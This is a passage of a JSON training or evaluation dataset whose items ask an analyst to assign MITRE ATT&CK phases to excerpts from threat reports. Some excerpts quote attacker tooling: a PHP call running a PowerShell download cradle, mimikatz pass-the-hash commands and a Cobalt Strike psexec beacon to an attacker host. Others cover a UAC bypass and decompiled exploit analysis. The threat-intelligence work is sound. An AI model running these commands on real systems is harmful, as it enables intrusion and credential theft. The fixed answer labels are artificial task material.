0, 0) >= 0 && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_74) && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_78) ) if ( (unsigned __int16)lv_ushort_74 <= 1u ) { lv_struc_38.vw_version_20 = lv_ushort_74; lv_struc_38.vw_used_22 = lv_ushort_78; v12 = 0; for ( i = 4; ; lv_position_7c = i ) { v25 = v12; v14 = struc_3a9de4::parseStylesContent_3a7048(&lv_struc_38, lp_oseg_68, i, v_result_8 = v14; if ( v14 == 0xFFFFFFE8 ) break; if ( v14 != 1 ) goto return(@edi)_3a78dd; i = lv_struc_38.v_header_long_4 + 6 + lv_position_7c; \nThe listing shows the beginning of the function at 0x3C1FAF0F with the name object_9c204 4::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be. This function references the DocumentViewStyles stream. Specifically, both the DocumentViewStyles and DocumentEditStyles strings are referenced next to each other separated by only a conditional. Hence, both streams likely use the same implementation to parse their contents and a parameter is used to distinguish between them. At the bottom of the same function is a loop that is likely used to process the variable-length contents of the streams. If we examine the function being called for each iteration of this loop, we will encounter the following function, which is of reasonable complexity and appears to process some number of record types using a 16-bit integer as their key. The shape of this function is shown in the following screenshot. \nThe following list is a decompilation of the function from the previous screenshot that parses record types out of the stream. Exploring the different cases implemented by this method shows that it is responsible for parsing around 10 different record types. Most of the functions used to parse each individual record types are prefaced with a function that ensures that the necessary fields are constructed and initialized before processing its corresponding record. This implies that the conditional allocations involved with these fields can only be used once per instance of the document, and will need to already have been called to avoid the unpredictability of the data that is left on the stack during the exploitation process. \nDissecting a complex vulnerability and achieving arbitrary code execution in Ichitaro Word   \np_oseg_0 = ap_oseg_0;   \nv_documentType_8 = this->v_documentType_8;   \nv_boxHeaderResult_0 = struc_3a9de4::readBoxHeader?_3a6fae(this, ap_oseg_0);   \nif ( v_boxHeaderResult_0 != 31 )   \n{ vw_header_word_0 = (unsigned __int16)this->vw_header_word_0; p_owner_24 = this->p_owner_24; lp_owner_8 = p_owner_24; if ( vw_header_word_0 > 0x2003 ) { v_wordsub(2004)_0 = vw_header_word_0 - 0x2004; if ( v_wordsub(2004)_0 ) { v_word(2005)_0 = v_wordsub(2004)_0 - 1; if ( !v_word(2005)_0 ) { if ( av_currentStreamState?_c != 5 ) { struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0); p_styleObject_3a712c = struc_3a9de4::readStyleType(2005)_3a6bec(this, p_oseg goto returning(@eax)_endrecord_3a736f; } goto returning(1)_endrecord_3a70f9; } v_wordsub(2006)_0 = v_word(2005)_0 - 1; if ( v_wordsub(2006)_0 ) { v_word(2007)_0 = v_wordsub(2006)_0 - 1; if ( v_word(2007)_0 ) { v_word(2008)_0 = v_word(2007)_0 - 1; if ( !v_word(2008)_0 ) { if ( p_object_60 ) { \nLABEL_93: p_styleObject_3a712c = object_9d0d30::readStyleType(2008)_391906( p_object_60, p_oseg_0, this->v_header_long_4, Av_parsingFlagField_8, this->v_documentType_8, ap_unkobjectunion_10.ap_unkobject_10, &lv_result_4); \ngoto returning(@eax)_endrecord_3a736f; goto returning(@esi)_endrecord_3a7625; return p_result_3a705e; struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0); object_9e5ffc = ap_nullunion_14.object_9e5ffc; goto readStyleType(1000)_3a7365; } return 0xFFFFFFE8; \nThe first set of conditions that are listed in the decompilation leads to the parser for record type 0 x2005. The second case, as per the decompilation, is used to parse record type 0x2008. It is this record type that contains the entirety of the vulnerability leveraged by this document. \nThe next listing shows the parser for record type 0x2008. In it, we can immediately spot a staticsized array named lv_objects(6)_6c due to the loop that initializes it. After a closer look at the references to this array, the function uses an index, lvw_index_70, to access elements of the lv _objects(6)_6c array. This index is directly read from the file as one of the output parameters of the arena_reader::read_header_779756 method without verifying it is within bounds of the array. Immediately after the index is used fetch an item from the array, the item is then written to. Thus, this out-of-bounds index is made significantly more useful due to it being used for writing into a constant-sized array allocated in the frame. \nint __thiscall object_9d0d30::readStyleType(2008)_391906( object_9d0d30 \\*this, JSVDA::object_OSEG \\*ap_oseg_0, int av_size_4, int av_someFlag_8, int av_documentType_c, int ap_nullobject_10, int \\*ap_unusedResult_14) v34 = 0; p_object_14 = this->v_data_20.p_object_14; \nv9 = JSFC::malloc_181e(sizeof(object_9d14a0));   \nif ( v9 ) v10 = object_9d14a0::constructor_38cb12(v9, this->v_data_20.p_object(9c2044)_c, th   \nthis->v_data_20.p_object_14 = v10;   \nobject_9d14a0::addSixObjects_38cb7d(v10);   \nfor ( i = 0; i < 6; ++i ) lv_objects(6)_6c[i] = object_9d14a0::getPropertyForItemAtIndex_37a71d(this->v_da   \nwhile ( lvw_case_84 != 0xFFFF )   \n{ switch ( lvw_case_84 ) { case 0u: if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_7 goto LABEL_47; LOWORD(lv_size_74) = lv_size_74 - 2; if ( !arena_reader::read_ushort_779780(&lv_triple_80, &v25) ) goto LABEL_47; lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(0)_14 = v25; goto LABEL_51; case 5u: if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_7 goto LABEL_47; LOWORD(lv_size_74) = lv_size_74 - 2; wstringtoggle_7fb182::initialize_7fb182(&v15, lv_wstring(28)_54); LOBYTE(v34) = 0; object_9d15a0::moveinto_field(20,2c)_6c0780(lv_objects(6)_6c[lvw_index_70], goto LABEL_51; case 7u: if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70 goto LABEL_47; lv_size_74 += 0xFFFC; if ( !arena_reader::read_int_6b5bc1(&lv_triple_80, &v17) ) goto LABEL_47; lv_objects(6)_6c[lvw_index_70]->v_data_20.v_typeField(7)_38 = v17; goto LABEL_51; default: if ( !arena_reader::read_ushort_779780(&lv_triple_80, &lv_size_74) ) goto LABEL_47; break; \nThe index is used to refer to the correct element in an array of pointers to an object. The object used for each element of the array, object_9d15a0, is 0x68 bytes in size and is primarily composed of integer fields that are used to store data read from the current stream. Thus, the vulnerability enables us to write data to one of the object's fields depending on which case was read during parsing. Examining each of the cases individually, there are three ways in which the implementation may be written to object_9d15a0. \nThe first class involves dereferencing a pointer from the indexed object and then writing a 16-bit integer zero-extended to 32 bits to the target of the pointer. \nThe second class also involves dereferencing a pointer but allows us to write a 32-bit integer to the pointer's target. ",
        "output": "discovery",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: 002 System Services: Service Execution| Use of Service Control Manager (services.exe) to launch Sysinternals dbgview.exe 001 Command and Scripting Interpreter: PowerShell| Use of PowerShell to run cmdlets used for data exfiltration and lateral movement ",
        "output": "execution",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos discovered that the attacker gains initial access to the victim's network by exploiting the vulnerability CVE-2024-4577. \nCVE-2024-4577 is a critical remote code execution (RCE) vulnerability in Windows-based PHP installations using CGI configurations. It arises from the \"Best-Fit\" behavior in Windows code pages, where certain characters are replaced in command-line inputs. The flaw in the PHP-CGI module misinterprets these characters as PHP options, allowing attackers to execute arbitrary PHP code on the server when using Apache with a vulnerable PHP-CGI setup. \nTo target the vulnerability, the attacker leverages a publicly available exploit Python script \"PHPCGI_CVE-2024-4577_RCE.py\". The script checks to see if a specific URL is vulnerable to the CVE2024-4577 vulnerability. It does this by sending a specifically crafted POST request to a target URL with PHP code designed to trigger the vulnerability. If the response contains the MD5 hash \"e10adc3949ba59abbe56e057f20f883e\", it indicates a successful exploitation. Then, the exploit script prompts the user to input commands as PHP code that are executed on the vulnerable servers and gets the response displayed to the attacker. \nSnippet of the CVE-2024-4577 exploit script. \nIn this intrusion, we found that the attacker has executed an embedded PowerShell command in the PHP code to trigger the infection. \n<?php system ('powershell -c \"Invoke-Expression (New-Object System.Net.WebClie \nThe attacker triggers the infection by executing the PowerShell command through the PHP code, leading to the download and execution of a PowerShell injector script from the C2 server on the victim machine memory. \nThe PowerShell injector script is embedded with either base64-encoded or a hexadecimal data blob of the Cobalt Strike reverse http shellcode. Upon execution, it injects and executes the Cobalt Strike reverse HTTP shellcode on the victim machine's memory and connects to the Cobalt Strike server running on the C2 server over HTTP, enabling remote access to the victim machine. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial C2 picked up on the following alerts:\nWith the TorClient Registry Binary being confirm for its namesake after some time:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bypass User Account Account (T1088) \nWhile attackers control targeting of victims in many cases, they don't always wind up with an elevated user during initial compromise. Even when a spearphishing victim is a local administrator, the attacker will oftentimes need to escalate from a Medium to High integrity process before continuing. Off-the-shelf offensive tools like Koadic can enable that transition with relative ease, including several different UAC Bypass modules out of the box. \nFor this example, we'll examine a well-known UAC Bypass technique published by Matt Nelson (@enigma0x3) while leveraging the Computer Management launcher - CompMgmtLauncher.exe - which is interoperable with the Microsoft Management Console (MMC). Details about this technique, which still works on Windows 7 endpoints, can be found here. \nThis technique involves modifying the Windows Registry to change the default association of files the MMC interacts with   \n(HKCU\\Software\\Classes\\mscfile\\shell\\open\\command) to an application of the attacker's choice. By deploying a malicious script object with a compatible extension and altering this registry key value to launch a built-in script interpreter, an adversary is able to circumvent controls. \nRight after this registry modification, look for the new process creation event tied to the auto-elevated Microsoft program (CompMgmtLauncher.exe), followed by common Koadic stager descendant processes such as Mshta.exe or Rundll32.exe - processes that should be running in a high integrity context. We can combine those events into an ordered sequence and constrain the total run-time for all the steps to complete within 10 seconds. ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process injection was used on the beachhead host to to inject into svchost.exe\nThe Bazar Loader malware was using a code signing certificate signed by Digicert under the organizationNOSOV SP Z O O\nAt the time of delivery, the executable had a detection rate of 1/69 in Virustotal.\nThe Cobalt Strike beacons used in the environment used similar code signing certificates.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team. We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked.\nAs noted above, the attacker created a task called \"BrowserUpdate\" to masquerade the scheduled task as a web browser update task.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We don't know exactly how initial access was gained in any of the compromises. However, recovered installation-related components and attacker activity suggest possible spearphishing and abuse of misconfigured network and application monitoring softwareZabbix. Potential Zabbix abuse is suggested by a LunarWeb installation component imitating Zabbix logs, and a recovered backdoor command used to get the Zabbix agent configuration. Additionally, evidence of spearphishing includes a Word document installing a LunarMail backdoor via a malicious macro.\nBelow, we provide details of the installation-related components and initial attacker activity.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The shellcode-based backdoor named SNOWYDRIVE generates a unique identifier based on the system name, username, and volume serial number. This identifier serves as a unique ID when communicating to its command and control (C2) server. The C2 domain is usually found hard-coded in the shellcode. \nThe Spies Who Loved You: Infected USB Drives to Steal Secrets | Mandiant | Google Cloud Blog The backdoor supports the following commands: ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The following discovery commands were initiated by Qbot through the injected process on the beachhead system:\nLater, more discovery commands were observed from the Cobalt Strike injected process on another victim system:\nOn the same host, AdFind was executed to enumerate all computer objects in the Active Directory domain:\nOn second day of the intrusion, threat attackers downloaded a tool namedNetwork Scanner(netscan.exe) by SoftPerfect on the domain controller, using Internet Explorer.\nThe tool was used to trigger another port scan, this time targeting TCP ports 445 and 3389.\nPeriodic requests toapi.ipify.orgwere observed throughout the intrusion by the SysWOW64\\Explorer process and by the ATERA agent.Ipify.orgcan be used to determine the public facing IPv4 address of the network. We've observed the use ofipify.orgin previous cases.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Throughout the intrusion, the attackers staged results from their discovery within either the temporary directory or C:\\ProgramData. As a reminder, the following discovery commands redirected their results to C:\\ProgramData\\hosts_live.txt and C:\\ProgramData\\servers_live.txt.\nAdditionally, populated and collected files included:\nThe extensive creation of text files (.txt and .csv) within the C:\\ProgramData directory provides detection and hunting opportunities as legitimate software commonly leverages sub-folders of this directory.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The phishing email, displayed in Figure 1, masquerades as an urgent order supplement request sent to various companies to deceive the recipient. It also employs a blurred image in the PDF file to entice the victim to click a concealed button. The attached PDF file is shown in Figure 2.\nThe malicious URL was hidden in a stream object (/ObjStm), making it challenging to detect. However, extracting the URL by pdf-parser reveals that it is located in object 14 within stream object 1, as shown in Figure 3.\nUpon clicking the file, the victim connects to the URL https://www[.]cttuae[.]com/ems/page[.]html, a website that seemingly offers travel services. The attacker had uploaded a malicious HTML file to the \"ems\" path on July 12, with the source code displayed in Figure 4.\nInstead of directly downloading a virus, the attacker adopts a more sophisticated approach by utilizing the \"search-ms\" protocol to trigger a search result. Specifically, they search for \"ORDER_SPEC0723\" on a remote cloud storage server facilitated by DriveHQ. Notably, the file \"ORDER_PSEC0723\" masquerades as a PDF file icon, but upon closer inspection, it is revealed to be an LNK file that executes a PowerShell script within the same folder, as shown in Figure 5. This tactic allows the attacker to initiate their malicious activities discreetly.\nThe PowerShell script \"pf.ps1\" (Figure 6) is then executed, beginning with the use of \"regsvr32\" to launch the injector \"doc.dll,\" which was written in Rust. It opens the decoy PDF file \"T.pdf\" and executes \"AA.exe.\" Finally, all File Explorer windows are closed using \"Stop-Process -Force.\" The PDF file \"T.pdf\" in Figure 7 appears clean and contains clear text, intending to distract the victim from other malicious actions. The following section will look in detail at \"doc.dll\" and \"AA.exe.\"",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: NetSupport Deployment\nWScript was used to execute2326.jsafter the user ran the file from the zipped archive.\nFollowing initial execution,2326.jsinvokes an encoded PowerShell command that reaches out to a hard-coded domain,hxxp://1otal.com/index/index.php, downloading and invoking the contents as PowerShell code.\nThe contents downloaded fromhxxp://1otal.com/index/index.phptake the form of an obfuscated PowerShell script responsible for the initial deployment of NetSupport. The full obfuscated contents of this script can be found on thislink.\nThe following is the deobfuscated NetSupport deployment script. Note, this script has been cleaned up for brevity.\nThe NetSupport deployment script takes the following steps:\nCheck the execution name of the script against a list of filenames, if any match the script will exit.The names checked include avast, avg, sample, analysis, malware, sandbox, and virus. \nThe names checked include avast, avg, sample, analysis, malware, sandbox, and virus. \nAll the required files for the NetSupport deployment are packaged inside the deployment script. All these files will be extracted into a randomly named folder under the users%APPDATA%directory.The randomly named folder will be a combination of 8 randomly generated letters and numbers, such as%APPDATA\\8EDX3iOxor%APPDATA%\\KcEwrg3X. \nThe randomly named folder will be a combination of 8 randomly generated letters and numbers, such as%APPDATA\\8EDX3iOxor%APPDATA%\\KcEwrg3X. \nThe NetSupport executable will be added to the Registry Run Key for persistence. \nThe NetSupport executable will then be invoked to begin execution.\nThe NetSupport script creates all required files in the%APPDATA%folder.\nIn addition, an entry was added toHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runforpresentationhost.exe(NetSupport) to facilitate persistence on the machine.\nLastly, the PowerShell script will finish by invoking the NetSupport executable directly.\nBatch Script Automation\nThe threat actor was observed making use of Batch scripts to automate some of their tasks, such as executing discovery programs, dumping credentials, and establishing persistence.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While hunting for this chain of adversary methodologies, Mandiant uncovered numerous new malware families and investigations. The adversary's effort to remain undetected by chaining methodologies has come with mixed results, as many of the samples discussed in this post have very low detection ratings. However, with this new research, detecting these methodologies should be more accessible and further expand the defender's hunting and detection repertoire. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1095: Non-Application Layer Protocol T1102.001: Dead Drop Resolver T1105: Ingress Tool Transfer T1571: Non-Standard Port T1573.001: Symmetric Cryptography ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To identify vulnerable hosts in the compromised network, InvisiMole uses the added functionality in the RC2CL backdoor. Its command 222 was previously used for controlling backdoor configuration values-now the attackers use it to send a range of IP addresses to the compromised computer. \nThe backdoor first tests whether these addresses are active by sending them ICMP echo requests, and retrieves their MAC addresses using the SendARP API. \nTo determine whether the host supports the vulnerable SMBv1.0 protocol, the backdoor: \n\u2022\t Opens SMB session on port 445 (and optionally on another port).   \n\u2022\t Sends SMB_COM_NEGOTIATE packet (0x72) to negotiate the SMB protocol (see Figure 11). It only lists \"NT LM 0.12\" as a supported dialect, forcing the server to choose SMBv1.0 protocol for the session, as long it is supported by the server. \n\u2022\t Sends SMB_COM_SESSION_SETUP_ANDX packet (0x73) to setup the SMB session (see Figure 12). The only command in the packet is No further commands (0xFF). The backdoor doesn't send any more commands within the session. \n\u2022\t Logs off the session by sending SMB_COM_LOGOFF_ANDX packet (0x74) with the command No further commands (0xFF), as shown in Figure 13. \nThe results of this scan are reported back to the C&C server. \nAfter identifying vulnerable hosts, we assume the attackers push a tool that tries to exploit the vulnerability via the same backdoor-RC2CL already has mechanisms in place to download and execute additional code. ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Also seen in ourlast report on Emotet, threat actors leveraged Rclone to exfiltrate data to Mega (Mega.nz) storage services.\nFrom the rclone.conf file, the threat actors left the details of the remote account being used.\nWith the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out of the environment.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We believe that to elevate their privileges, the threat actor might have abused an odd default Windows behavior surrounding changing service permissions:\nTo abuse this SCM behavior, the threat actors were seen stopping the Spooler service before deleting the service's HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Spooler\\RequiredPrivileges registry entry, restarting the service and injecting into the newly created spoolsv.exe process.\nThe effect of deleting the RequiredPrivileges registry entry can be observed in the following screenshots where the post-modification spoolsv.exe process is seen with a flurry of additional permissions, all of which the threat actors may enjoy post-injection.\nScheduled tasks were used by the threat actors to run much of their malware as SYSTEM. The initial execution tasks for FlawedGrace used the \\2 registered task were created to run under SYSTEM as seen by the Author in the task details.\nThis could then be seen with the user NT AUTHORITY\\SYSTEM running the task command and arguments in process creation logs.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Ursnif\nUrsnif was seen using the following domains and IPs:\nWe also observed several modules for Ursnif downloaded from the following IP:\nJoeSandbox reported this sample having the following configuration:\nPivoting on domains registered in WHOIS with the emailsnychkova73@bk.ruor organizationRus Lak, reveals many similar domains as seen in this intrusion.\nCobalt Strike\nThe following Cobalt Strike C2 server was observed:\nThe following Cobalt Strike configuration was observed:\nChecking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike,83cd09b0f73c909bfc14883163a649e1d207df22.\nAtera & SplashTop\nEven though the threat actor installed these agents, we did not observe any activity with these tools.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Valid AccountsTo maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount. It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic. The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).\nTo achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:\nAfter activating the account, the threat actors set the password of this account to P@ssw0rd and added it to Administrators and Remote Desktop Users groups.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The older \"mode\" variant of BitPaymer uses the Windows registry for persistence, while the newer service variant will attempt to install itself as a service. If that fails, it will fall back to using the Windows registry. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To move laterally, the threat actors used credentials gathered at the previous stage. If they only had password hashes, they carried out Pass-The-Hash attacks using Mimikatz. \nUse Alternate Authentication Material: Pass the Hash  T1550.002 mimikatz's sekurlsa::pth /user:Administrator /domain:{redacted} /ntlm:{redacted} /run:\"%COMSPEC% /c echo 70c64df2976 > \\\\.\\pipe\\277bf3\" mimikatz's sekurlsa::pth /user: {redacted} /domain:{redacted} /ntlm:{redacted} /run:\"%COMSPEC% /c echo 22074328564 > \\\\.\\pipe\\bce0a1\" \nLateral Tool Transfer  T1570 \njump psexec64 {redacted} dns windows/beacon_dns/reverse_dns_txt (ns1.colunm.tk:53) on {redacted} via Service Control Manager (\\\\[redacted]\\ADMIN\\$\\c3632b3.exe) copy c:\\users\\public\\COMSysUpdate.exe \\\\172.19.97.101\\c\\$\\users\\public\\COMSysUpdate.exe ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first-stage DLL, cyzfc.dat, is created by the PowerShell script in the path %AppData%\\Local\\cyzfc.dat. It is a 64-bit DLL that exports one function: PointFunctionCall. \nThe PowerShell script then executes cyzfc.dat by calling rundll32.exe. After connecting to the first-stage command-and-control server at pandorasong[.]com (95.216.59.92), cyzfc.dat begins to install the final payload by taking the following actions: \n1. Allocate a ReadWrite page for the second-stage payload   \n2. Extract the second-stage payload as a resource   \n3. Take a header that is baked into the first payload with a size $O x E F$ bytes   \n4. Concatenate the header with the resource, starting at byte $0x12A$ .   \n5. De-XOR the second-stage payload with a rolling XOR (ROR1), starting from   \nkey $O x C5$ . \nThe second stage is an instance of Cobalt Strike, a commercially available penetration testing tool, which performs the following steps: \n1. Define a local named pipe with the format $\\backslash\\backslash.\\backslash p i p e\\backslash M S S E-<n u m b e r>-s e r v e r,$ where <number> is a random number between 0 and 9897 2. Connecting to the pipe, write it global data with size 0x3FE00 \nAnalysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers | Microsoft Security Blog \n3. Implement a backdoor over the named pipe: \n1. Read from the pipe (maximum 0x3FE00 bytes) to an allocated buffer   \n2. DeXOR the payload onto a new RW memory region, this time with a   \nmuch simple XOR key: simple XORing every 4 bytes with 0x7CC2885F   \n3. Turn the region to be RX   \n4. Create a thread that starts running the payload \nThe phase that writes to global data to the pipe actually writes a third payload. That payload is XORed with the same XORing algorithm used for reading. When decrypted, it forms a PE file with a Meterpreter header, interpreting instructions in the PE header and moving control to a reflective loader: \nThe third payload eventually gets loaded and connects to the command-andcontrol (C&C) server address that is baked-in inside configuration information in the PE file. This configuration information is de-XORed at the third payload runtime: \nThe configuration information itself mostly contains C&C information: \nCobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware. ",
        "output": "command and control",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon. On the image below, we can see that the CS beacon process is injected into LSASS.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Obtaining credentials Mimikatz Gaining Outlook credentials   \nPass-the-hash and pass-the-ticket   \nPropagation via Windows Admin Shares   \nWindows Management Instrumentation (WMI) ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1548 Abuse Elevation Control Mechanism\nThe threat actor used the built-in Meterpreter getsystemmodulewhich uses various techniques to create a payload as SYSTEM.\nT1053.005 Scheduled Task/Job: Scheduled Task\nDuring a meterpreter session, the threat actor created a scheduled task to launch a payload as NT AUTHORITY\\SYSTEM :\nT1068 Exploitation for Privilege Escalation\nLinPEAS\nFor several of the targets, after gaining shell access, we found the threat actor executingLinPEASto try to discover privilege escalation paths on the exploited host.\nMetasploit\nFrom the Metasploit history, we observed the threat actor using various Linux privilege escalation modules:\nnetwork_manager_vpnc_username_priv_esc CVE-2018-10900\nptrace_traceme_pkexec_helper CVE-2019-13272\ncve_2021_4034_pwnkit_lpe_pkexec CVE-2021-4034",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ScreenConnect\nAs part of the installation process, ScreenConnect persists through an auto-start service. The built-in System event7045(A service was installed in the system) provides visibility into such installations.\nShould the System events be unavailable, Sysmon registry value-set events (event13) provide sufficient visibility. As shown below, we can deduce the service's start mode through the values:\nTypeof data0x10(SERVICE_WIN32_OWN_PROCESS) \nStartof data0x2(SERVICE_AUTO_START)\nAlthough the Sysmon data of theImagePathvalue had been corrupted through log collection, the persisted service command line could be recovered by runningEric Zimmerman's Registry Exploreragainst the acquired System hive (C:\\Windows\\System32\\config\\SYSTEM) and associated transaction log (C:\\Windows\\System32\\config\\SYSTEM.LOG1).\nThe recovered command line below defines the following options, asreported byAnomali Threat Research.\neas session type, can beSupport,Meeting,Access. \nyas process type, can beGuestorHost. \nhas the URI to the relay service's URI. \npas the relay service's port. \nsas a globally unique identifier for client identification. \nkas the encoded encryption key, used for identity verification. \ntas the optional session name.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During our research, the DoNex ransomware was operating a data leak site on TOR, which listed five victims in Europe and North America.\nSince no new victims have been added since February 27th, the threat actor has likely already ceased operations and moved on.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
